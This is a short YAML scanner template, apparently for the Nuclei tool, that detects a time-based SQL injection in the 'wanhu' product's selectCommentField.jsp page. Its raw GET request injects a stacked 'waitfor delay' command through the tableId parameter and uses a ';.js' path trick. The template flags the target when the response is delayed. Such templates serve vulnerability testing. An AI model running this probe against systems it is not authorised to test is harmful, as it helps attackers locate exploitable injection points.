id: wanhu-selectCommentField-sql-injection-time-delay

info:
  name: SQLi Time Delay (Windows Compatible)
  author: iSee857
  severity: high
  description: wanhu selectCommentField sqlInjection

requests:
  - method: GET
    raw:
      - |
        GET /defaultroot/platform/custom/custom_database/dropdownselect/selectCommentField.jsp;.js?tableId=1%3Bwaitfor+delay+'0%3A0%3A5'--+- HTTP/1.1
        Host: {{Host}}
        Accept: */*
        Connection: close

    matchers:
      - type: dsl
        dsl:
          - "duration >= 5"